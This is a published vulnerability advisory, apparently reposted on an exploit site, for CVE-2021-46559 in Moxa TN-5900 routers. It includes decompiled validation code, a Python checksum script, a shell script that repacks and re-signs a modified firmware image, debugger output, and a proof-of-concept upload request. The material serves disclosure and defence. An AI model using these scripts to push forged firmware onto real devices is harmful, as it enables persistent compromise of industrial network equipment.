@@ -1,0 +1,332 @@
+id: 37289
+date: 01/31/2022
+title: Moxa TN-5900 Firmware Upgrade Checksum Validation Exploit
+author: Matthew Bergin
+cves: CVE-2021-46559
+
+Title: Moxa TN-5900 Firmware Upgrade Checksum Validation Vulnerability
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2022-001.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Moxa
+     Affected Product: TN-5900
+     Affected Version: v3.1 and prior
+     Platform: Moxa Linux
+     CWE Classification: CWE-354 Improper Validation of Integrity
+                         Check Value
+     CVE ID: CVE-2021-46559
+
+
+2. Vulnerability Description
+
+     Moxa TN-5900 v3.1.0 and prior uses an insecure method to
+     validate firmware updates. A malicious user with access to the
+     management interface can upload abritrary code in a crafted
+     firmware image simply by replacing a CRC value in the image
+     header.
+
+
+3. Technical Description
+
+     Analysis on this vulnerability began when KoreLogic noticed that
+     the Ssgl2_update_session_now function is immediately called
+     when the URL /goform/web_fwUpload is given to the management
+     application. The Ssgl2_update_session_now function will enable
+     a session after authentication through the user interface.
+
+       undefined4 websSecurityHandler(longlong *param_1) {
+         ...
+         ...
+         if (requestPtr[0x20] != 0) {
+           ...
+           ...
+           field_1 = strncmp(in_t0,"/init.asp",9);
+           if (CONCAT44(extraout_v0_hi_07,field_1) != 0) {
+             field_2 = strncmp(in_t0,"/goform/web_fwUpload",0x14);
+             if (CONCAT44(extraout_v0_hi_08,field_2) == 0) {
+               Ssgl2_update_session_now(local_490);
+             }
+             lVar3 = Ssgl2_webmultisession_session_verify(local_490,auStack104);
+             ...
+           }
+         }
+         ...
+         ...
+       }
+
+     Reviewing the web_fwUpload function showed the code is used to
+     update the operating firmware of the affected device. Before
+     the firmware is accepted, it must pass a check. This check is
+     provided through the Ssys_firmwareCheck function.
+
+       void web_fwUpload(longlong *param_1,longlong *param_2) {
+         ...
+         if (lVar1 == -1) {
+           FUN_1200222c0(param_1,"../upgrade.asp","Firmware Upgrade Fail! Restart the device.");
+           ...
+         }
+         else {
+           printf("%s() buffer upload datalen = %d\n","web_fwUpload",*(param_1 + 0x39));
+           ...
+           ...
+           }
+           else {
+             puts("Ssys_firmwareCheck");
+             local_118 = Ssys_firmwareCheck(lVar1,4,*(param_1 + 0x39));
+             if (-1 < local_118) {
+               local_118 = Ssys_writeProgram(lVar1);
+             }
+             if (local_118 < 0) {
+               printf("%s() %d firmware check fail ret = %d\n","web_fwUpload",0x7c0,local_118);
+               ...
+               ...
+             }
+             ...
+       }
+
+     The Ssys_firmwareCheck function checks that the kernel and
+     file system have an expected length and that the provided
+     image passes a checksum algorithm.
+
+       undefined8 Ssys_firmwareCheck(ulonglong param_1,longlong param_2,ulonglong param_3,ulonglong param_4) {
+         ...
+         if (param_2 == local_44._4_4_) {
+           ...
+           if (local_4c._0_4_ == 0x400000) {
+             if ((uVar4 < 0x1800001) && ((uVar4 & 3) == 0)) {
+               ...
+               file_check_sum(param_1 + 0x20,local_4c._4_4_ + 0x400000,&local_50);
+               uVar3 = 0;
+               if (local_50 != local_3c._0_4_) {
+                 FUN_0010d230("[Error] %s L%d : Firmware checksum error (0x%x), should be 0x%x
+\r\n","Ssys_firmwareCheck",0x484,local_50,local_3c._0_4_,extraout_t1_00,extraout_t2_00,extraout_t3_00);
+                 uVar3 = 0xfffffffffffffffc;
+               }
+             }
+             else {
+               FUN_0010d230("[Error] %s L%d : Rootfs length error (%d), max to %d bytes
+\r\n","Ssys_firmwareCheck",0x47a,uVar4,0x1800000,extraout_t1,extraout_t2,extraout_t3);
+               uVar3 = 0xfffffffffffffffd;
+             }
+           }
+           else {
+             FUN_0010d230("[Error] %s L%d : Kernel length error (%d), should be %d bytes
+\r\n","common.c","Ssys_firmwareCheck",0x474,local_4c._0_4_,0x400000,extraout_t2,extraout_t3);
+             uVar3 = 0xfffffffffffffffe;
+           }
+         }
+         else {
+           FUN_0010d230("[Error] %s L%d : Firmware file logo mismatch (0x0x), should be 0x%x
+\r\n","Ssys_firmwareCheck",0x46c,local_44._4_4_,param_2,extraout_t1,extraout_t2,extraout_t3);
+           uVar3 = 0xffffffffffffffff;
+         }
+         ...
+       }
+   
+     The checksum is simple and implemented using the following algorithm:
+   
+       #!/usr/bin/env python3
+       import sys
+       from functools import partial
+       from binascii import hexlify
+   
+       with open(sys.argv[1],"rb") as f:
+           f.seek(0x20)
+           checksum = int(0)
+           for dword in iter(partial(f.read,4),b''):
+               checksum += int(hexlify(dword),16)
+       print (hex(checksum)[-8:])
+
+     A breakpoint was set on the file_check_sum function using GDB
+     and the valid ROM provided by Moxa was processed. The result
+     of the checksum process was retrieved.
+
+       Breakpoint 14, 0x000000fff6fac3a4 in _init () from target:/tmp/moxa/usr/lib64/libsyscommon.so
+       (gdb) x/1x 0xfffbf4ce30
+       0xfffbf4ce30:    0x2f43167a
+
+     The bytes 0x2f43167a were found in the ROM image itself inside
+     of a header containing 0x20 bytes.
+
+       $ hexdump -C moxa-tn-5900-series-firmware-v3.1.rom
+       00000000  00 40 00 00 01 45 b0 00  00 00 00 20 00 00 00 04  |.@...E..... ....|
+       00000010  2f 43 16 7a 03 01 00 00  14 04 07 11 00 00 00 00  |/C.z............|
+
+     The following script was constructed to disassemble and rebuild
+     a firmware image using the expected format.  The script will
+     create a file /korelogic on the filesystem. The file will be
+     zero bytes.
+
+       #!/bin/sh
+       IF=$1
+       OF=$2
+       dd bs=1 if=$IF of=$IF.header_1 count=$((0x10))
+       dd bs=1 if=$IF of=$IF.checksum skip=$((0x10)) count=4
+       dd bs=1 if=$IF of=$IF.header_2 skip=$((0x14)) count=$((0x20-0x14))
+       dd bs=1 if=$IF of=$IF.kernel skip=$((0x20)) count=$((0x1d9669-0x20))
+       dd bs=1 if=$IF of=$IF.splitter skip=$((0x1d9669)) count=$((0x400020-0x1d9669))
+       dd bs=1 if=$IF of=$IF.cramfs skip=$((0x400020))
+       cramfsswap $IF.cramfs $IF.cramfs.swap
+       sudo cramfsck -x fs $IF.cramfs.swap
+       touch fs/korelogic
+       mkcramfs fs/ $IF.cramfs.modified
+       cat $IF.header_1 $IF.checksum $IF.header_2 $IF.kernel $IF.splitter $IF.cramfs.modified > $OF
+       ./checksum.py $OF | xxd -r -p > check_value
+       dd bs=1 conv=notrunc if=check_value of=$OF seek=$((0x10)) count=4
+   
+     Here is the script running.
+   
+       $ sudo ./make_moxa_image.sh moxa-tn-5900-series-firmware-v3.1.rom hacked.rom
+       16+0 records in
+       16+0 records out
+       16 bytes copied, 9.967e-05 s, 161 kB/s
+       4+0 records in
+       4+0 records out
+       4 bytes copied, 7.4433e-05 s, 53.7 kB/s
+       12+0 records in
+       12+0 records out
+       12 bytes copied, 0.000118918 s, 101 kB/s
+       1939017+0 records in
+       1939017+0 records out
+       1939017 bytes (1.9 MB, 1.8 MiB) copied, 3.76396 s, 515 kB/s
+       2255287+0 records in
+       2255287+0 records out
+       2255287 bytes (2.3 MB, 2.2 MiB) copied, 4.32499 s, 521 kB/s
+       21344256+0 records in
+       21344256+0 records out
+       21344256 bytes (21 MB, 20 MiB) copied, 40.8949 s, 522 kB/s
+       Filesystem is big endian, will be converted to little endian.
+       Filesystem contains 3313 files.
+       CRC: 0x9b7eefd0
+       4+0 records in
+       4+0 records out
+       4 bytes copied, 7.4433e-05 s, 53.7 kB/s
+
+     The hacked.rom image is then processed and the same breakpoint
+     is hit. The new checksum should be 0x0987aafc. The new checksum
+     is patched into the hacked.rom image already from the above
+     script.
+
+       $ hexdump -C hacked.rom
+       00000000  00 40 00 00 01 45 b0 00  00 00 00 20 00 00 00 04  |.@...E..... ....|
+       00000010  09 87 aa fc 03 01 00 00  14 04 07 11 00 00 00 00  |/C.z............|
+   
+     GDB output confirms that the checksum is the same result:
+   
+       Breakpoint 2, 0x000000fff72853a4 in _init () from target:/tmp/moxa/usr/lib64/libsyscommon.so
+       (gdb) x/1x 0xfffbad34d0
+       0xfffbad34d0:    0x0987aafc
+   
+     When processing the hacked.rom image, we receive a new error.
+   
+       Firmware check failed, error occurs when write kernel to flash. Restart the device.
+
+     Comparing the indicated error against the pseudo-c indicates we
+     have passed the firmware validation checks. This was confirmed
+     using GDB as well.
+
+       void web_fwUpload(longlong *param_1,longlong *param_2) {
+         ...
+         if (lVar1 == -1) {
+           ...
+         }
+         else {
+           ...
+           else {
+             puts("Ssys_firmwareCheck");
+             local_118 = Ssys_firmwareCheck(lVar1,4,*(param_1 + 0x39));
+             if (-1 < local_118) {
+               local_118 = Ssys_writeProgram(lVar1);
+             }
+             ...
+         }
+   
+     The error indicating a write exception is expected as we were
+     not operating on a Moxa device but were instead emulating the
+     Moxa firmware on a MIPS development board.
+
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has released a patch which remediates the described
+     vulnerability. Release notes are available at:
+
+     https://www.moxa.com/en/support/product-support/security-advisory/tn-5900-secure-routers-vulnerabilities
+
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     and Josh Hardin of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+     2021.02.05 - KoreLogic submits vulnerability details to Moxa.
+     2021.02.08 - Moxa acknowledges receipt and the intention to
+                  investigate.
+     2021.03.02 - Moxa notifies KoreLogic that a patch for this
+                  vulnerability is expected to be available in June 2021.
+     2021.04.16 - 45 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.06.07 - KoreLogic requests update on the status of the
+                  proposed TN-5900 patch.
+     2021.06.15 - Moxa informs KoreLogic that the patch is expected to be released in mid-July 2021.
+     2021.06.23 - 90 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.07.25 - Moxa informs KoreLogic that the patch is expected to be released in mid-August 2021.
+     2021.09.22 - 150 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.12.21 - 210 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.12.27 - Moxa notified KoreLogic that the patch is complete and ready for release..
+     2021.12.28 - Moxa public acknowledgement.
+     2022.01.25 - KoreLogic requests CVE from Mitre.
+     2022.01.28 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+     POST /goform/web_fwUpload HTTP/1.1
+     Host: 192.168.10.10
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate
+     Content-Type: multipart/form-data; boundary=---------------------------11395841764774651092787307532
+     Content-Length: <HTTP REQUEST SIZE>
+     Connection: close
+     Upgrade-Insecure-Requests: 1
+   
+     -----------------------------11395841764774651092787307532
+     Content-Disposition: form-data; name="binary"; filename="hacked.rom"
+     Content-Type: text/plain
+   
+     <HACKED.ROM FIRMWARE IMAGE>
+     -----------------------------11395841764774651092787307532
+     Content-Disposition: form-data; name="submit"
+   
+     submit
+     -----------------------------11395841764774651092787307532--
+   
+     HTTP/1.1 200 OK
+     Server: GoAhead-Webs
+     Pragma: no-cache
+     Cache-control: no-cache
+     Content-Type: text/html
+     Transfer-Encoding: chunked
+   
+     <!DOCTYPE html>
+     <html>
+     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+     <head>
+     <title></title>
+     </head>
+     <body bgcolor="#E8FFF7" text="#000000" topmargin="10" leftmargin="12" >
+     <font size="2" face="Arial, Helvetica, sans-serif, Marlett">
+     <p>Firmware check failed, error occurs when write kernel to flash. Restart the device.</p>
+     </font></body>
+     </html>
+
+#  0day.today [2023-03-24]  #
